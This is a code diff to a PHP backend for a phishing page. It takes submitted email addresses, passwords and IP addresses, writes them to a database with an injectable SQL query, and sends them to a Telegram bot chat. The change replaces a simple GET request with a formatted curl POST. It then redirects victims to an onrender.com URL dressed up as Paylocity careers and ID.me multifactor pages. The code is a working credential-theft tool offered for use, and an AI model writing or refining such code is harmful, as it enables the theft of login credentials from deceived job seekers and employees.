@@ -10,15 +10,48 @@ if ($_SERVER["REQUEST_METHOD"]=="POST"){
 $query = "INSERT INTO form (useremail,userpassword,timecol,ip) VALUES ('$_POST[useremail]','$_POST[userpassword]',NOW(),'$_POST[ip]')";
 $result = pg_query($query);
 
+
+// Get and define form inputs
+    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
+    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
+    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
+
+
+// Define message structure before sending to Telegram
+$telegram_message = "📝 *New Form Submission*:\n\n".
+                    "👤 *Useremail:* $useremail\n".
+                    "📧 *Userpassword:* $userpassword\n".
+                    "💬 *IP:* $ip";
+
+$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
+
+// Send message using CURL (allows better error handling)
+$data = [
+    'chat_id' => TELEGRAM_CHAT_ID,
+    'text' => $telegram_message,
+    'parse_mode' => 'Markdown'
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $telegram_url);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+$response = curl_exec($ch);
+curl_close($ch);
+
+
+
 // Send to Telegram
-$telegram_message = "New Form Submission:\n\n".
-                    "Email: $useremail\n".
-                    "Password: $userpassword\n".
-                    "ip: $ip";
+// $telegram_message = "New Form Submission:\n\n".
+//                     "Email: $useremail\n".
+//                     "Password: $userpassword\n".
+//                     "ip: $ip";
 
-$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage?chat_id=".TELEGRAM_CHAT_ID."&text=".urlencode($telegram_message);
+// $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage?chat_id=".TELEGRAM_CHAT_ID."&text=".urlencode($telegram_message);
 
-file_get_contents($telegram_url);
+// file_get_contents($telegram_url);
 
 header("Location:https://paylocity.onrender.com/www.paylocity.com/careers/all-listings.job.34092/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8.php");
 exit;
